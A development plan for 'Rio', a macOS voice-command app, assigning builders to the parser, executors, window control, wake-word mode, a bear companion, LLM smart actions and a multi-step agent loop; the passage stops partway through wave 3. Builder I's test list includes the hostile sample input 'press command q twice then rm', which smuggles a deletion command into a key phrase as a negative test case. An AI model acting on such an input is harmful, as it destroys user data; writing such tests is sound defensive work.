# Rio Actions: plan and builder brief

Owner request (2026-11-03): make Rio "so much more than a dictation app". Hold a key, say
"open Chrome", and Rio does it. Plus a hands-free conversation mode toggled with a three-finger
trackpad tap. Owner decisions:

| Decision | Choice |
|---|---|
| Dictation key | **Fn (hold)**: unchanged, pure dictation, never runs a command |
| Action key | **Fn + Control held together** (either order; Control pressed at any point before Fn is released counts). Never types text |
| Saying "Rio" on the action key | **Optional**: "open Chrome" and "Rio, open Chrome" both work |
| Abilities | Apps & websites, Mac controls, Smart AI actions, Window control (all four) |
| Conversation mode | **Three-finger tap** toggles an always-listening mode; every command must start with "Rio" |

Existing keys that must keep working: Fn hold = dictation, Right Option tap = toggle dictation,
lone Right Command tap = Fix Last Dictation. Edit Mode is OFF for the owner (Control is free).

## Shared contract

`Sources/RioActions/RioActionTypes.swift` (committed by the lead) defines `RioAction`,
`RioActionParse`, `RioActionResult`, `WindowCommand`, `InstalledApp` and friends. **Do not change
it.** If you truly need a change, add a note to your final report; the lead merges contract
changes. All new production code goes under `Sources/RioActions/` unless your package says
otherwise.

Pinned APIs. Implement exactly these signatures so the waves fit together:

```swift
// Builder B
struct RioActionParser {
    init(installedApps: [InstalledApp])
    func parse(_ transcript: String) -> RioActionParse
}
enum InstalledAppCatalog { static func scan() -> [InstalledApp] }   // /Applications, /System/Applications(+Utilities), ~/Applications
enum AppNameMatcher { static func bestMatch(for spoken: String, in apps: [InstalledApp]) -> InstalledApp? }
@MainActor final class RioActionExecutor {
    init(windowController: WindowControlling,
         companion: RioCompanionDirecting?,
         typeText: @escaping @MainActor (String) async -> Bool)
    func execute(_ action: RioAction) async -> RioActionResult
}

// Builder C
@MainActor protocol WindowControlling { func apply(_ command: WindowCommand) -> RioActionResult }
@MainActor final class WindowController: WindowControlling { init() }
final class ThreeFingerTapMonitor { init(onTap: @escaping @MainActor () -> Void); func start() -> Bool; func stop() }
@MainActor final class WakeWordListener {
    init(onCommand: @escaping @MainActor (String) -> Void)   // text AFTER "Rio", already trimmed
    func start() async -> WakeWordListenerStartResult            // enum: started, permissionDenied, unavailable(String)
    func stop()
    var isListening: Bool { get }
}
```

`WindowControlling` is declared by builder C in `Sources/RioActions/WindowControlling.swift`.
Builder B needs it to compile. B may add a throwaway copy in
`Sources/RioActions/STUB_B_WindowControlling.swift`, which the lead deletes at merge. Builder A
may stub B/C types the same way in files named `STUB_A_*.swift`. Never edit another builder's
files.

## Wave 1 (parallel, one git worktree each)

### Builder A: action key and pipeline (`feat/rio-actions-a`)
Owns: `Sources/ShortcutCore/*`, `Sources/AppState.swift`,
`Sources/SettingsView.swift`, `Sources/MenuBarView.swift`, new
`Sources/RioActions/RioActionCoordinator.swift`, related tests.
- New session intent for Fn+Control. Today the hold binding is Fn with exact modifier
  matching: pressing Control must NOT cancel or end the Fn session. Look at
  `permittedAdditionalExactMatchModifiers` (AppState ~2014) and how Edit Mode's manual
  modifier is detected (`resolveSessionIntent`, ~2315). Control held at press time OR pressed
  any time before Fn is released → action intent. Control alone does nothing. Right Option tap
  toggle and Fix Last must behave exactly as before (add regression tests in ShortcutCoreTests).
- An action session never pastes, types, touches `lastTranscript`, the correction learner, undo
  or Paste Again. After transcription (same Groq Whisper path, same vocabulary prompt), strip an
  optional "Rio"/"yo Rio"/"… bro" (reuse `TeddyCommand`'s name handling; make the helper
  internal if needed). Then: a Teddy trick phrase → run the trick, as today. Otherwise
  `RioActionCoordinator.run(transcript)`, which does `parser.parse` → `.actions` executes in
  order, stopping at the first failure; `.unknown` → smart resolver hook (a `RioSmartResolving`
  protocol you declare in the coordinator file with `func resolve(_ text: String) async throws
  -> [RioAction]`, nil in wave 1, so unknown → shrug "I don't know how to do that yet"); `.empty`
  → nothing.
- Feedback: do NOT edit overlay/art files (builder F owns them). Publish
  `@Published var rioActionPhase: RioActionPhase` on AppState: `.listening` the instant
  Fn+Control is detected, `.working("Opening Google Chrome")` while running,
  `.succeeded`/`.failed(message)` after, back to `.idle` ~2.5 s later. While F's work isn't
  merged, nothing visual is required beyond the existing status text.
- History: record action sessions with a distinguishable intent and the result summary (no
  new user-content logging beyond what history already stores).
- Settings: a "Rio Actions" section with an Enable toggle (default ON), the key shown as
  "Fn + Control", and a note that Fn alone is still dictation. If Edit Mode is enabled with
  manual modifier Control, show a collision message and make Fn+Control go to Rio Actions.
- Wiring: AppState gets the parser/executor through one small factory function
  `RioActionsWiring.make…()` in `Sources/RioActions/RioActionsWiring.swift`. Ship it backed by
  your `STUB_A_*` types. The lead rewrites this file at merge to use B's and C's real types.

### Builder B: parser and executors (`feat/rio-actions-b`)
Owns: `RioActionParser.swift`, `InstalledAppCatalog.swift`, `AppNameMatcher.swift`,
`RioActionExecutor.swift`, `MacControls.swift` (all under `Sources/RioActions/`),
`Tests/RioActionParserTests.swift`, `Tests/AppNameMatcherTests.swift`.
- Parser: deterministic, pure, case-insensitive, punctuation-tolerant, tolerant of Whisper
  quirks (trailing ".", "Open Chrome." / "open up chrome" / "launch" / "start" / "fire up";
  "close/quit/kill X"; "switch to/go to/show me X"; "hide X"). Optional leading "Rio"/"hey Rio"/
  "yo Rio" and trailing "please"/"bro". Compound: "open Chrome and Spotify", "put Chrome on the
  left and Warp on the right" → multiple actions.
- Websites: "open YouTube/Gmail/GitHub/Netflix/…" with a built-in map of ~30 popular sites; an
  installed app with that name wins (YouTube has no app, but "open Spotify" is the app). Spoken
  domains ("open hala discover dot com") → URL. Only http(s) URLs are ever built.
- Search: "search (for) X", "google X", "look up X", "search YouTube for X" → `webSearch` or a
  YouTube search URL.
- Mac controls: "volume up/down", "turn it up", "volume 40 / to 40 percent", "mute",
  "unmute"; "play/pause/next song/skip/previous"; "lock (my) screen"; "take a screenshot
  (of the window / of a selection)"; "turn on/off do not disturb / focus".
- Windows phrases → `.window(WindowCommand)`: "put/move/snap X (to the) left/right/top/bottom",
  "maximize/full screen (X)", "center (X)", "minimize (X)", "move X to the other screen /
  next screen". No app → nil appName (frontmost).
- "type …" / "write …" → `.typeText` (conversation mode uses it); "stop listening" /
  "go to sleep" / "that's all" → `.stopListening`.
- Anything else → `.unknown(textWithoutName)`. Never guess wildly: an unmatched app name in
  "open X" stays `.openApp(name: X)` so the executor can say "I couldn't find X", unless X is a
  known website.
- AppNameMatcher: aliases (chrome→Google Chrome, vs code/vscode→Visual Studio Code,
  settings/system preferences→System Settings, messages/imessage→Messages, terminal, finder,
  facetime, word/excel/powerpoint→Microsoft …), normalised exact, prefix, token and edit-distance
  matching with a strict threshold (no "Mail" for "Maps"). Deterministic tie-breaks.
- Executor, opening apps (owner's HARD RULE: the bear never adds delay): start the launch at
  once with `NSWorkspace.openApplication` and `activates = false`, THEN call
  `companion?.runAndPunchDockIcon(…)` with a `punch` closure that activates the app. If it
  returns false or the companion is nil, activate immediately. Same for `.switchToApp` of a
  running app (punch = activate). Never wait on the bear before starting the launch.
- Executor, other: NSWorkspace open (re-scan once if not found), activate/hide via
  NSRunningApplication, quit via `terminate()` (never force). Open URLs in the default browser.
  Volume via `NSAppleScript("set volume output volume N")` (in-process Standard Additions, no
  Automation prompt), media and volume keys via NX_SYSDEFINED CGEvents, lock screen via the
  Ctrl+Cmd+Q CGEvent, screenshots via `/usr/sbin/screencapture` with FIXED arguments to
  `~/Desktop/Rio Screenshot <date>.png` (`-i` selection, `-w`… use `-l`/`-W` as appropriate), DND
  best-effort: run the user's Shortcut named "Rio Focus On"/"Rio Focus Off" through
  `/usr/bin/shortcuts run` if it exists, else fail with a helpful message. `.window` → injected
  WindowControlling. `.typeText` → injected closure. Smart cases → `.failed("…coming soon")` in
  wave 1. No Process call may ever take user text as an executable or a flag.
- Tests: 120+ parser cases (real Whisper-style phrasing, mishearings like "Crome", negative
  cases that must be `.unknown`), matcher tests, and a pure test of how volume/screenshot
  arguments are built.

### Builder C: windows and conversation-mode building blocks (`feat/rio-actions-c`)
Owns: `WindowControlling.swift`, `WindowController.swift`, `WindowGeometry.swift` (pure frame
math), `ThreeFingerTapMonitor.swift`, `TapGestureDetector.swift` (pure),
`WakeWordListener.swift`, `WakePhraseExtractor.swift` (pure), plus tests
`Tests/WindowGeometryTests.swift`, `Tests/TapGestureDetectorTests.swift`,
`Tests/WakePhraseExtractorTests.swift`.
- WindowController: Accessibility API (Rio already has Accessibility). Resolve the app by spoken
  name (reuse `AppNameMatcher` if B has it; otherwise match against running apps' localized
  names with a small private helper), pick its focused/main window, compute frames on the
  window's current screen `visibleFrame` (menu bar/Dock aware; AX uses top-left origin, so
  convert carefully, multi-display safe), and set position then size then position again
  (the known AX resize quirk). Minimize via kAXMinimizedAttribute. Next screen keeps the
  relative frame. User-facing results: "Moved Google Chrome to the left".
- ThreeFingerTapMonitor: global trackpad touches through the private MultitouchSupport
  framework, loaded with `dlopen`/`dlsym` (MTDeviceCreateList, MTRegisterContactFrameCallback,
  MTDeviceStart, MTDeviceStop, MTUnregisterContactFrameCallback). All built-in and Magic
  Trackpads. Callback is on a background thread: feed frames to the pure `TapGestureDetector`,
  hop to the main actor only on a detected tap. A tap = exactly 3 fingers down together
  (within ~120 ms), total contact ≤ 300 ms, movement ≤ small threshold, all lift, no 4th
  finger, debounce 600 ms. Return false from `start()` if the framework or a device is
  unavailable. The owner's system three-finger tap (Look Up) is OFF; 3-finger swipes are ON
  (must not trigger: movement threshold).
- WakeWordListener: on-device only (`SFSpeechRecognizer(locale: en-US)`,
  `requiresOnDeviceRecognition = true`, refuse to start if on-device isn't supported, so no
  audio ever leaves the Mac in this mode). AVAudioEngine input tap → recognition request.
  Restart the task before Apple's ~1 min limit and after each command. A command = speech
  containing the name ("Rio" + variants from `TeddyCommand.names`, plus "hey Rio") followed
  by words, finished by ~1.2 s of silence or a final result. Emit only the text after the name
  (via the pure `WakePhraseExtractor`). Speech without the name is dropped and never stored.
  Expose `pause()`/`resume()` so dictation can take the mic. Request speech permission only
  from `start()`. Info.plist already has NSSpeechRecognitionUsageDescription. Update its
  wording to mention Rio.

### Builder F: the corner bear companion (`feat/rio-actions-f`)
Owner's words: "a small teddy bear in that hoodie and jeans, sleeping in the corner of my
screen until he is awakened. The dictation can awaken him. Instead of the pill popping up,
let it just be him speaking from the left corner on a mic. For any actions as soon as I click
the action button, he immediately wakes up. If [an action opens an app on my Dock] he will run
to that [Dock icon] as fast as he can. As soon as he punches it, that app will open.
Otherwise just open the app regularly." And: "I shouldn't be waiting so long for him to run
… it shouldn't be more than [the natural delay for an app to open], so he should be running
pretty fast."
Owns: `Sources/RecordingOverlay.swift`, `Sources/TeddyBearViews.swift`, `Sources/TeddyArt*.swift`,
`Sources/TeddyBearCore.swift`, `Sources/TeddyRagdollCore.swift`, new
`Sources/RioCompanion/*.swift` and their tests. Must not edit AppState (read its published state
only: `isRecording`, `isTranscribing`, the audio level the pill uses, moments, spoken looks,
tricks, and the new `rioActionPhase`. If `rioActionPhase` doesn't exist in your worktree yet,
add a `STUB_F_` extension providing it as a constant `.idle`).
- Art: the same brown bear in the purple hoodie, small (about 64 pt tall at rest), now with
  **blue jeans** (denim legs, cuff turn-ups, stitching) for the hoodie outfit. Keep the suit
  outfit and spoken looks (shemagh/thobe, safa/kurta) working on him. New poses: **asleep**
  (curled/slumped against the corner, slow breathing, drifting "z z Z"), **waking** (stretch,
  blink, ~0.3 s), **talking into a mic** (sitting up, holding the mic, mouth driven by the
  audio level, as the pill bear does today), **thinking** (dots), **alert/listening** for the
  action key (ears up, wide eyes, instantly, no slow wake), **sprint** (fast run cycle, speed
  lines) and **punch** (jump + fist into the icon, small impact burst).
- Placement: bottom-left corner of the screen with the menu bar (`NSScreen.screens[0]`),
  inset from the edges, above windows, click-through (`ignoresMouseEvents`), on all Spaces
  including full-screen apps, never takes focus, and doesn't sit on top of the Dock if the Dock
  is on the left. Low CPU when asleep (≤ 10 fps idle animation or a timer-driven redraw, no
  continuous 60 fps).
- Behaviour: dictation (Fn) wakes him into the talking pose. This REPLACES the drop-down pill
  for normal dictation, and the transcript status/moments (shrug, undo, sent, milestone,
  learned) play on him in the corner. The action key wakes him instantly into alert. After
  ~20 s idle he goes back to sleep. Teddy tricks ("Rio go crazy", jelly, Dougie) start and end
  at his corner. Keep a Settings option "Rio style: Corner bear (default) / Classic pill" so
  the old pill is one toggle away; put it in a new `RioCompanionSettingsSection` view (the
  lead embeds it in Settings at merge).
- Dock run (implements `RioCompanionDirecting`; read the HARD RULE in the contract): find the
  app's Dock icon through the Accessibility tree of the Dock process (`com.apple.dock` → AXList
  → AXDockItem; match by the item's URL attribute or title against the app). Only for a Dock at
  the bottom, not auto-hidden. Sprint along the bottom edge to the icon's x, jump and punch:
  the whole sprint + punch ≤ `RioCompanionTiming.maxRunDuration` (0.4 s) no matter the
  distance (scale the speed), call `punch` on impact, then jog back to the corner and fall
  asleep. If anything is unavailable, return false immediately.
- Pure, tested cores: the state machine (sleep/wake/talk/alert/run/punch/return transitions
  and timeouts), the sprint timing (always ≤ 0.4 s, impact time), and the Dock-item matching.

## Wave 2 (contract v2; builds on the merged wave 1 at branch `feat/rio-actions`)

Wave 1 is merged and wired. Read `Sources/RioActions/RioActionTypes.swift` (contract v2 adds
the new `RioAction` cases) and `Sources/RioActions/RioActionHandlers.swift` (extension points).
The lead has already wired everything; each builder **replaces the STUB files it owns** and
adds new files. Never edit a file another builder owns. Lead-owned files you must not edit:
`RioActionTypes.swift`, `RioActionHandlers.swift`, `RioActionsWiring.swift`,
`RioActionCoordinator.swift`, `RioActionExecutor.swift`, `RioActionParser*.swift` (B's), and
everything under `Sources/RioCompanion/` (F's). If you need a change there, say so in your report.

How the pieces connect (already wired):
- Parser: after the built-in controls and before window/app verbs, `RioExtraPhrases.parse`
  tries `RioContextPhrases` (E), `RioVoicePhrases` (G), `RioKnowledgePhrases` (H), then
  `RioSystemPhrases` (I). Each is pure (no AppKit), is in `TEST_PRODUCTION_SOURCES`, and must
  only claim phrasings that are clearly its own. "open Chrome", "open YouTube" and "close
  Spotify" must still reach B's app/site logic. Add a test proving your phrases don't steal
  B's: the existing ~330 `RioActionParserTests` cases must stay green.
- Executor: any action B doesn't handle is offered to the handlers in order: Voice (G),
  Knowledge (H), System (I), Smart (E). Each returns nil when the action isn't its own.
  `executor` is passed in so a handler can run other actions.
- Coordinator: if `action.requiresConfirmation`, it awaits `RioConfirmationCenter.shared.confirm`
  (E) and treats false as cancelled. `RioUndoJournal.shared` (G) gets `willExecute` and
  `didExecute` for every action. Unknown text goes to `RioSmartResolverFactory.make()` (E).
- After every action, AppState calls `RioVoice.shared.speak(RioPersonality.spokenLine(for:
  outcome, hour:))` (G). The corner bear mirrors `RioVoice.shared.isSpeaking/level` and
  `RioCompanionCenter.shared.{timerRemaining, timerRinging, celebrateCount, isHelpVisible}`
  (G owns those objects). It also observes `RioConversationMode.shared` (D).
- The result text (`.done(summary:)` / `.failed(message:)`) is what the bear shows on his speech
  card and what Rio says, so keep it short, friendly and specific.

### Builder D: conversation mode, mic awareness, offline action key (`feat/rio-actions-d`)
Owns: `RioConversationMode.swift`, `MicUsageMonitor.swift`, new `RioOfflineTranscriber.swift`,
and the conversation-mode and offline parts of `Sources/AppState.swift` and `SettingsView.swift`
(+ `MenuBarView.swift`). D is the ONLY wave-2 builder allowed to edit AppState, SettingsView and
MenuBarView.
- `RioConversationMode` (ObservableObject, keep the stub's published API): on/off driven by
  `ThreeFingerTapMonitor` (C) and a menu bar item "Conversation Mode". Each heard command
  (`WakeWordListener`, C) goes through the same `RioActionCoordinator` path as the action key,
  with the same `rioActionPhase` feedback. It turns off on `.stopListening` ("Rio, stop
  listening"), on a second three-finger tap, from the menu item, and after **5 minutes** without
  a command. Play a soft sound on/off and have Rio say "I'm listening" / "Going to sleep"
  through `RioVoice.shared.speak`.
- While on, the listener pauses during Fn and Fn+Control sessions and resumes after.
- **Pause during calls (#16):** `MicUsageMonitor.isOtherAppUsingMicrophone()` uses CoreAudio:
  on macOS 14+, `kAudioHardwarePropertyProcessObjectList` plus
  `kAudioProcessPropertyIsRunningInput` for processes other than Rio. On older systems, return
  false. While another app is using the mic, conversation mode is paused (`isPaused`) and
  resumes when it stops. Poll cheaply, about every 2 s, only while conversation mode is on.
- **Offline action key (#4):** if `NetworkMonitor` says offline when an Fn+Control session ends,
  transcribe the recorded file on-device (`SFSpeechURLRecognitionRequest`,
  `requiresOnDeviceRecognition`) and run it through the coordinator, so built-in commands keep
  working offline. Fn dictation offline is unchanged.
- Settings: Conversation Mode card with the three-finger-tap toggle, an explanation (the mic
  stays on, nothing leaves the Mac until it hears "Rio", it pauses during calls, auto-off after
  5 min), and a "Start conversation mode" button.
- Tests: pure state machine for on/off/pause/auto-off/stop-listening; the mic-usage decision
  logic, with the CoreAudio query behind a protocol.

### Builder E: smart AI, context replies, reading, confirmations (`feat/rio-actions-e`)
Owns: `RioSmartResolverFactory.swift`, `RioSmartActionHandler.swift`, `RioContextPhrases.swift`,
`RioConfirmationCenter.swift`, and new `RioSmart*.swift` / `RioContext*.swift` / `RioMessaging*.swift` files.
- Resolver: uses the configured LLM (same key, base URL, model and `LLMAPITransport` as
  post-processing; look at how PostProcessingService builds requests) with a strict JSON output
  schema covering EVERY `RioAction` case except `typeText`, `stopListening`, `pressKeys` and
  `emptyTrash`. Questions ("what's the capital of…", "how many ounces in a cup") → `.answer(text)`,
  kept short enough to speak, at most 2 sentences. Validate every field; drop malformed or unknown
  items; dates are ISO-8601 resolved against the current date and time zone, which you put in the
  prompt. **Offline (#4):** check `NetworkMonitor` first and fail fast with "I'm offline right
  now. I can still open apps, control music and windows." On timeout or error: "I couldn't reach
  my brain just now."
- Handler: `.answer` → `.done(summary: text)`. `.sendMessage` resolves the contact via the
  Contacts framework, then sends through Messages with NSAppleScript, passing the recipient and
  body as AppleScript parameters through `NSAppleEventDescriptor` and never splicing them into
  source. `.replyInConversation` types into the focused compose field of the frontmost messaging
  app (Messages, WhatsApp, Slack, Discord, Telegram, Mail…) and presses Return. Refuse if the
  focused element isn't a text field. `.createReminder` uses EventKit. `.selectionTask` reads the
  selection via Accessibility (or a copy fallback that restores the clipboard): summarize, explain
  and translate → `.done(summary:)` (spoken and shown); improve → replace the selection.
  `.readAloud`: `.selection` (above), `.lastMessage` (newest incoming message text in the
  frontmost messaging app via Accessibility; best effort per app, and say so when unsupported),
  `.page` (front browser page text: Safari/Chrome via Accessibility web area, trimmed to about
  1,500 characters) → `.done(summary: text)` so Rio reads it out.
- Context phrases (pure): "reply (saying|with|that) X", "tell them X", "read (me) my last
  message", "read this (page|article)", "read (the|my) selection", "summarize/explain/translate
  this (to X)", "text|message <name> (saying) X" → `.sendMessage`.
- `RioConfirmationCenter`: a small non-activating Rio panel near the corner bear with the
  recipient and the exact text (or "Empty the Trash?"), Send/Confirm (Return) and Cancel (Esc),
  20 s timeout = cancel. Never auto-confirms.
- Info.plist: NSContactsUsageDescription, NSAppleEventsUsageDescription,
  NSRemindersUsageDescription and NSRemindersFullAccessUsageDescription. Entitlements:
  `com.apple.security.automation.apple-events`.
- Settings: E may not edit SettingsView. Expose a `RioSmartSettingsSection` view (Smart actions
  toggle, default ON, with the disclosure that unrecognised commands, and for selection, reading
  and reply tasks the relevant text, go to the configured LLM provider). The lead embeds it.
- Tests: resolver JSON → actions (valid, malformed, hostile: never anything outside the set),
  context phrases, and AppleScript parameter building (no user text in source).

### Builder G: voice, personality, timers, undo, help (`feat/rio-actions-g`)
Owns: `RioVoice.swift`, `RioPersonality.swift`, `RioCompanionCenter.swift` (keep the published
API), `RioUndoJournal.swift`, `RioVoiceActionHandler.swift`, `RioVoicePhrases.swift`, and new
`RioTimer*.swift` / `RioHelp*.swift` / `RioVoice*.swift` files.
- **Voice:** AVSpeechSynthesizer, on-device and free. Pick the nicest installed English voice
  (premium or enhanced if present), with a slightly higher pitch and quick rate so he sounds like
  a small bear. Drive `level` from the synthesizer's word and phoneme callbacks (or the output
  buffer via `write(_:toBufferCallback:)` and an RMS meter) so the mouth moves. **Silent rule
  (#5): never speak while `MicUsageMonitor.isOtherAppUsingMicrophone()` is true** (a call is
  happening); show the line on the bear's card only. Also stay silent while Rio itself is
  recording. A Settings toggle "Rio talks back" (default ON) lives in `RioVoiceSettingsSection`,
  which the lead embeds.
- **Personality (pure, tested):** `spokenLine(for:hour:)` varies phrasing deterministically from
  a seed (no repeated line twice in a row; inject the seed in tests). Openers like "On it!",
  "Done!", "Ta-da" for successes, gentle humour for failures ("Hmm, I couldn't find that one.
  Want to try again?"), time-of-day greetings on the first command of the morning, and
  occasional bear puns (rare). Keep lines short. Never speak long summaries twice: for
  `.answer` and `.readAloud` results, speak the text itself. Bump
  `RioCompanionCenter.celebrateCount` on milestone moments (e.g. the 100th action).
- **Timers:** `.startTimer` (also parse "10 minute timer", "set a timer for 2 and a half
  minutes", "timer 30 seconds called pasta"), `.cancelTimer`, `.timerStatus` ("how much time is
  left"). One timer at a time, shown by the bear holding the clock via
  `RioCompanionCenter.timerRemaining`. At zero: ring (`timerRinging`), a gentle sound, Rio says
  "Your pasta timer is done!", and a notification. Stop ringing after 30 s or on any key or
  "Rio, stop".
- **Undo:** `RioUndoJournal` records an inverse for undoable actions: openApp → quit it only if
  it wasn't running before; quitApp → reopen; hideApp → unhide; volume/brightness → previous
  level; window → previous frame (read the frame before; add a
  `WindowController+Snapshot.swift` extension); startTimer → cancel; createEvent/createReminder
  → delete what was created (E's and H's handlers report the created identifier through a small
  API you define in your own file; coordinate via your report). Non-undoable actions (messages,
  screenshots, typing) reply "I can't undo that one". `.undoLast` ("Rio, undo", "undo that",
  "put it back", "never mind") runs the inverse through `executor`.
- **Help:** `.showHelp` ("what can you do", "help", "what can I say") shows a small non-activating
  cheat-sheet panel next to the corner bear (`isHelpVisible` true, so he holds up his sign),
  grouped by category with real example phrases, closes on click/Esc or after 20 s, and Rio says
  a one-line summary.
- Tests: personality lines, timer phrase parsing and countdown math (injected clock), the undo
  inverse table, and the help catalogue (every category non-empty).

### Builder H: files, Spotlight, calendar, clipboard (`feat/rio-actions-h`)
Owns: `RioKnowledgeActionHandler.swift`, `RioKnowledgePhrases.swift`, and new `RioFiles*.swift`
/ `RioCalendar*.swift` / `RioClipboard*.swift` files.
- **Files:** `.openFile` / `.revealFile` via `NSMetadataQuery` (Spotlight) over the home folder:
  name match first, then content, ranked by last-used date; skip ~/Library and hidden files.
  Open with the default app or reveal in Finder. Phrases: "open my resume", "open the MAT108
  homework PDF", "find my tax return", "show me the Hala deck in Finder", "open my downloads
  folder" (well-known folders map directly). Must never steal "open Chrome".
- **Calendar (EventKit):** `.calendarAgenda(.today/.tomorrow/.next)` gives a spoken summary
  ("You've got 3 things today. Next: Call with Ali at 3 PM."); `.joinNextMeeting` finds the
  next/current event's Zoom/Meet/Teams/FaceTime URL in its URL, location or notes and opens it;
  `.createEvent` adds to the default calendar. Phrases: "what's next", "what's on my calendar
  (today|tomorrow)", "join my (next) meeting", "add lunch with Sarah Friday at 1" (parse common
  relative dates and times deterministically; leave anything vaguer to the smart resolver).
  Calendar permission on first use (`requestFullAccessToEvents` on 14+). Info.plist:
  NSCalendarsUsageDescription and NSCalendarsFullAccessUsageDescription.
- **Clipboard (#11):** `RioClipboardHistory` keeps the last 20 TEXT items IN MEMORY ONLY, never
  persisted. It polls `NSPasteboard.changeCount` every 0.75 s and skips concealed/transient
  types (`org.nspasteboard.ConcealedType`, `TransientType`, password managers). Commands:
  "what's on my clipboard" (`.readCurrent`), "paste the link I copied (earlier)"
  (`.pasteRecent("link")`, matching link/email/phone/address/number by type, otherwise by
  words), "show my clipboard history". Pasting puts the item on the pasteboard and sends ⌘V.
- Tests: phrase parsing (including the not-stealing tests), date and time parsing with a fixed
  "now", meeting-link extraction, clipboard matching and the concealed-type filter.

### Builder I: keyboard, browser and system control (`feat/rio-actions-i`)
Owns: `RioSystemActionHandler.swift`, `RioSystemPhrases.swift`, and new `RioKeyboard*.swift` /
`RioSystem*.swift` files.
- **Keys (#9):** `.pressKeys(KeyCombo)` posts CGEvents for allow-listed keys only
  (`KeyCombo.allowedKeys`). Phrases: "press command T", "press escape", "hit enter", "command
  shift 4", "select all", "copy", "paste", "undo that typing"… Never conflict with G's "undo".
  Only "undo typing" / "press command Z" map to keys.
- **Browser (#9):** `.browser(...)` maps to the standard shortcuts in the frontmost app (⌘T, ⌘W,
  ⇧⌘T, ⌃Tab, ⌃⇧Tab, ⌘[, ⌘], ⌘R, ⌘F; scrolling via scroll-wheel CGEvents or Space/⇧Space;
  top/bottom via ⌘↑/⌘↓). Phrases: "new tab", "close this tab", "reopen the tab", "next/previous
  tab", "go back", "go forward", "refresh", "scroll down/up", "scroll to the top/bottom", "find
  on page".
- **System (#10):** Wi-Fi on/off via `/usr/sbin/networksetup -setairportpower <device> on|off`
  (device discovered with `-listallhardwareports`, fixed args only). Bluetooth via IOBluetooth's
  `IOBluetoothPreferenceSetControllerPowerState`, loaded with dlsym and failing gracefully. Dark
  mode via NSAppleScript to System Events (`tell appearance preferences to set dark mode to
  true/false`; fixed source). Night Shift via the CBBlueLightClient private class, dlopen and
  graceful failure. Brightness up/down/set via DisplayServices private symbols with dlsym and a
  graceful failure ("I can't change brightness on this display"). Battery: IOKit power sources
  ("You're at 64%, charging, about 1 hour to full"). Empty Trash: Finder via NSAppleScript, with
  fixed source; the coordinator already asks for confirmation. Phrases: "turn off wifi",
  "bluetooth on", "dark mode on", "turn on night shift", "brightness up / to 50", "how much
  battery do I have", "empty the trash".
- Tests: phrase parsing (including the not-stealing tests), key-combo parsing against the
  allow list (hostile input like "press command q twice then rm" → nothing), and argument
  builders.

## Wave 3 (contract v3; starts after wave 2 is merged)

Owner picks (2026-11-03): #19 screen understanding, #20 click by voice, #21 multi-step tasks,
#22 memory, #26 email drafts, #27 notes, #28 instant math and conversions, #30 live translator
("I should just say, 'Translate what is being said,' and then it does that because sometimes I
will be prompting in Arabic"). Arabic prompts must also work as commands.

Contract v3 (the lead adds these to `RioAction` before wave 3 starts):
`describeScreen(question: String?)`, `click(label: String, ordinal: Int?)`,
`fillField(label: String, text: String)`, `runTask(goal: String)`,
`remember(fact: String)`, `recall(query: String)`, `forget(query: String)`,
`draftEmail(to: String?, subject: String?, body: String)`, `addNote(text: String)`,
`calculate(expression: String)`, `startTranslation`, `stopTranslation`, `speakLastTranslation`.

Wave 3 wiring (done by the lead; branch `feat/rio-actions` already contains waves 1–2 fully merged):
- Contract v3 cases are in `RioActionTypes.swift`. The undo plan marks them (read-only ones are
  ignored; click, fillField, runTask, remember, forget, draftEmail and addNote can't be undone. L
  may make remember/forget undoable in `RioUndoPlan.swift`, the only G file L may edit).
- Phrase order in `RioExtraPhrases`: Translator (M), Context (E), Screen (J), Voice (G),
  Knowledge (H), Memory (L), System (I), Task (K, last because it's the broadest).
- Handlers wired: `RioScreenActionHandler` (J), `RioTaskActionHandler` (K),
  `RioMemoryActionHandler` (L), `RioTranslatorActionHandler` (M). Replace your STUB files.
- AppState already calls `await RioCommandTranslator.shared.englishCommand(from:)` (M) on every
  action-key and conversation command before parsing. `RioTranslatorMode.shared.isOn` (M) is
  for the bear's headphones.
- **The smart resolver must learn the v3 actions:** builder L owns adding them to E's
  `RioSmartSchema.swift` and `RioSmartPrompt.swift`, with validation (text fields single-line
  where appropriate, `runTask` goals ≤ 300 chars, no URLs smuggled into `click` labels) and tests.
- Reuse what exists: the LLM client `RioSmartLLMClient.swift` (E), the AX helpers
  `RioAccessibility.swift` (E: `RioAX`), the confirmation panel `RioConfirmationCenter` (E),
  the contact chooser in `RioMessagingCore.swift` (E), `RioVoice` (G), `RioConversationMode` (D),
  `MicUsageMonitor` (D), and the transcription service and config in `TranscriptionService.swift`.
  Reading those files is fine; edit only files you own or that this brief explicitly gives you.
- Nobody in wave 3 edits AppState, SettingsView or MenuBarView. Each builder exposes a
  `Rio<Area>SettingsSection` view (if it needs settings) that the lead embeds.

### Builder J: screen understanding and click by voice (`feat/rio-actions-j`)
- #19 `.describeScreen`: capture the frontmost window with ScreenCaptureKit (Rio already has
  Screen Recording for context), downscale to ≤1280 px, send it with the question to the
  configured LLM's vision-capable model (on Groq a Llama 4 vision model; read the provider config,
  and if no vision model is available, fail with a friendly message), and answer in ≤3 spoken
  sentences. Phrases: "what's on my screen", "what does this error mean", "explain this",
  "summarize this window", "what am I looking at". Capture never includes Rio's own windows.
  Privacy disclosure plus a toggle (default ON).
- #20 `.click` / `.fillField`: walk the frontmost app's Accessibility tree (depth and time capped,
  e.g. 2,000 elements / 400 ms), find pressable elements (buttons, links, checkboxes, menu items,
  tabs, rows) whose title, description or label best matches (exact > prefix > fuzzy, ordinal
  for "the second…"), then AXPress. If several match equally, the bear says "Which one?" and
  briefly numbers them on screen; "Rio, the second one" picks. `.fillField` focuses the text
  field matching the label and types. Phrases: "click Send", "press the blue Submit button",
  "click the second link", "check remember me", "type hello into the search box". Refuse to
  click anything inside Rio's own windows or System Settings' privacy panes.

### Builder K: multi-step tasks (`feat/rio-actions-k`)
- #21 `.runTask(goal:)` ("Rio, find a flight to Doha next Friday under $800", "fill in this form
  with my details", "open my last email from Professor Kim and draft a reply"). An agent loop: each
  step takes a screenshot of the front window plus a compact Accessibility outline, sends them to
  the LLM, and gets back ONE next action from the closed `RioAction` set (open URL, click,
  fillField, pressKeys, browser, typeText, scroll) or `done(summary)` or `ask(question)`. Then it
  executes through the normal executor, so every safety rule still applies. Limits: 25 steps,
  3 minutes, stop on "Rio, stop" / Esc / Fn+Control. **Before any step that would buy, pay,
  submit, send, delete, book or sign in, ask the user via RioConfirmationCenter, with the exact
  step.** The bear shows a small progress card ("Step 4: searching flights"). Never types
  passwords, card numbers or one-time codes; it asks the user to do those, then continues.
- Tests: the step protocol parsing and validation (hostile outputs), the risky-step classifier,
